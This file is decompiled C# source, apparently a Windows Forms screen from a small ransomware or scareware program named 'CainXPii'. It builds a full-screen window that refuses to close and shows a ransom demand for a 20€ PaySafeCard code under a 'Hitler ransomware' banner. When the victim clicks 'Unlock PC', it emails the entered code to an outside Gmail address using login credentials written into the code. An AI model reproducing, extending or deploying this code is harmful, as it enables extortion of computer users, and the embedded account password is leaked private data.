using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace Ransomware;

[DesignerGenerated]
public class Form2 : Form
{
	private IContainer components;

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("PictureBox1")]
	internal virtual PictureBox PictureBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextBox1")]
	internal virtual TextBox TextBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button Button1
	{
		[CompilerGenerated]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Button1_Click;
			Button button = _Button1;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button1 = value;
			button = _Button1;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	public Form2()
	{
		((Form)this).add_Closing((CancelEventHandler)Form2_Closing);
		((Form)this).add_Load((EventHandler)Form2_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0077: Unknown result type (might be due to invalid IL or missing references)
		//IL_0081: Expected O, but got Unknown
		//IL_00ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f9: Expected O, but got Unknown
		//IL_018a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0194: Expected O, but got Unknown
		//IL_0211: Unknown result type (might be due to invalid IL or missing references)
		//IL_021b: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form2));
		Label1 = new Label();
		PictureBox1 = new PictureBox();
		Label2 = new Label();
		TextBox1 = new TextBox();
		Button1 = new Button();
		((ISupportInitialize)PictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		Label1.set_AutoSize(true);
		((Control)Label1).set_Font(new Font("Lucida Sans", 20.1f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label1).set_Location(new Point(12, 1133));
		((Control)Label1).set_Name("Label1");
		((Control)Label1).set_Size(new Size(2008, 231));
		((Control)Label1).set_TabIndex(0);
		Label1.set_Text("Warning: Your Files was Encrypted!!!!\r\n               to back your PC you have to Pay 20€ PaySafeCard\r\n               Please enter the Code of the Card below:");
		((Control)PictureBox1).set_BackgroundImage((Image)componentResourceManager.GetObject("PictureBox1.BackgroundImage"));
		((Control)PictureBox1).set_BackgroundImageLayout((ImageLayout)3);
		((Control)PictureBox1).set_Location(new Point(12, 12));
		((Control)PictureBox1).set_Name("PictureBox1");
		((Control)PictureBox1).set_Size(new Size(2509, 1118));
		PictureBox1.set_TabIndex(1);
		PictureBox1.set_TabStop(false);
		Label2.set_AutoSize(true);
		((Control)Label2).set_BackColor(Color.Transparent);
		((Control)Label2).set_Font(new Font("Microsoft Sans Serif", 26.1f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label2).set_ForeColor(Color.Red);
		((Control)Label2).set_Location(new Point(776, 24));
		((Control)Label2).set_Name("Label2");
		((Control)Label2).set_Size(new Size(1224, 101));
		((Control)Label2).set_TabIndex(2);
		Label2.set_Text("This IS HItler RANSOMWARE");
		((Control)TextBox1).set_Font(new Font("Microsoft Sans Serif", 14.1f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)TextBox1).set_Location(new Point(351, 1395));
		((Control)TextBox1).set_Name("TextBox1");
		((Control)TextBox1).set_Size(new Size(1371, 61));
		((Control)TextBox1).set_TabIndex(3);
		((Control)Button1).set_Location(new Point(1728, 1395));
		((Control)Button1).set_Name("Button1");
		((Control)Button1).set_Size(new Size(426, 61));
		((Control)Button1).set_TabIndex(4);
		((ButtonBase)Button1).set_Text("Unlock PC");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(16f, 31f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(2533, 1628));
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)PictureBox1);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form2");
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("CainXPii Ransomware");
		((Form)this).set_WindowState((FormWindowState)2);
		((ISupportInitialize)PictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		MailMessage mailMessage = new MailMessage();
		SmtpClient smtpClient = new SmtpClient("smtp.gmail.com");
		mailMessage.Subject = "Paysafecard Code";
		mailMessage.From = new MailAddress("vonyhd@gmail.com");
		smtpClient.Credentials = new NetworkCredential("vonyhd@gmail.com", "Vony12345");
		mailMessage.To.Add("Vazetv@gmail.com");
		mailMessage.Body = "Paysafecard code vom Verschlüsselten PC" + TextBox1.get_Text();
		smtpClient.EnableSsl = true;
		smtpClient.Port = Conversions.ToInteger("587");
		smtpClient.Send(mailMessage);
	}

	private void Form2_Closing(object sender, CancelEventArgs e)
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		e.Cancel = true;
		MessageBox.Show("Richtig Schlechte Idee...", "[CainXPII]");
	}

	private void Form2_Load(object sender, EventArgs e)
	{
	}
}
